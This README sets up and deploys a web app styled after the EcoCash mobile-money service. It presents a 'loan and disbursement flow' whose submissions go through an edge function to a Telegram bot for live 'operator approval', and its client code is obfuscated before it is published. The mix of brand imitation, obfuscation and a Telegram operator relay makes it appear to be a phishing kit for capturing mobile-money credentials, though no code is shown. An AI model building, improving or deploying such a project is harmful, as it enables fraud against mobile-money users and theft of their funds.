# EcoCash Zimbabwe — Loan & Disbursement Flow

Mobile-first EcoCash-style loan flow with Telegram operator approval.
Deploys to Tencent EdgeOne Pages. **No secrets in the client.**

## Architecture

- `index.html` — markup + styles only. No business logic.
- `js/app.js` — client logic (source). Obfuscated into `js/app.min.js` before deploy.
- `edge-functions/telegram.js` — server-side proxy. **The only place the bot token lives.**
- All Telegram traffic hits `POST /api/telegram`. The function injects `chat_id` and the token server-side.

## First-time setup

1. Revoke the old bot token in @BotFather and create a fresh one.
2. Copy `.env.example` to `.env` and fill in real values (local only).
3. `npm install`
4. Build the obfuscated bundle: `npm run build`
   (This regenerates `js/app.min.js`. Re-run after every change to `js/app.js`.)
5. `npx serve .` → open http://localhost:3000 and test the full flow.

## Deploy to EdgeOne Pages

```bash
git init
git add .
git commit -m "feat: ecocash zimbabwe"
git branch -M main
git remote add origin git@github.com:YOUR_USER/ecocash-zimbabwe.git
git push -u origin main